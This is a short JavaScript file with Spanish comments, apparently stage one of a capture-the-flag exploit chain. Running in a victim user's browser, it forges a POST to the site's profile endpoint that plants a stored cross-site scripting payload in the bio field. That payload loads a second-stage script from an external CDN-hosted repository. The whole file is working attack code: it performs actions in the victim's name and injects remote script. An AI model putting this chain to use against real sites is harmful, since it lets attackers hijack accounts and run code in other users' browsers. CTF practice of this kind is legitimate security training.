// stage1.js - Se ejecuta en el navegador de Pepe

// 1. Definimos el payload que se inyectará en la biografía de Pepe.
//    Este payload cargará nuestro script de la segunda etapa.
const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/FranDSchz/ctf-scripts/stage2.js"></script>';

// 2. Creamos un objeto FormData para simular el envío del formulario del perfil.
//    La petición de perfil es 'multipart/form-data'.
const formData = new FormData();
formData.append('bio', bioPayload);
// Es necesario enviar el campo 'profile_pic', aunque esté vacío.
formData.append('profile_pic', new Blob(), '');

// 3. Enviamos la petición POST para actualizar el perfil de Pepe en su nombre.
fetch('/profile', {
    method: 'POST',
    body: formData
});
